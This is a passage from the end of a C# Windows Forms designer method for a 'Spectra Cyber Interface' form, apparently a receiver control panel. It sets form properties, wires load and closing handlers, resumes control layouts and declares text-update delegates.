      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MainMenuStrip = this.menuStrip1;
      this.Margin = new Padding(8, 7, 8, 7);
      this.Name = nameof (SpectraCyber1Form);
      this.Text = "Spectra Cyber Interface";
      this.FormClosing += new FormClosingEventHandler(this.SpectraCyber1Form_FormClosing);
      this.Load += new EventHandler(this.SpectraCyber1Form_Load);
      this.grpSCSettings.ResumeLayout(false);
      this.grpSCSettings.PerformLayout();
      this.grpFrequencyBounds.ResumeLayout(false);
      this.grpFrequencyBounds.PerformLayout();
      this.nudPLLUpperFrequency.EndInit();
      this.nudPLLLowerFrequency.EndInit();
      this.nudDCOffset.EndInit();
      this.nudIFGain.EndInit();
      this.grpNoiseSource.ResumeLayout(false);
      this.grpNoiseSource.PerformLayout();
      this.grpStatus.ResumeLayout(false);
      this.grpStatus.PerformLayout();
      this.groupBox1.ResumeLayout(false);
      this.groupBox1.PerformLayout();
      this.menuStrip1.ResumeLayout(false);
      this.menuStrip1.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    private delegate void CommandWindowDelegate(string strText);

    private delegate void VoltageTextboxDelegate(string strText);

    private delegate void FrequencyTextboxDelegate(string strText);
  }
}
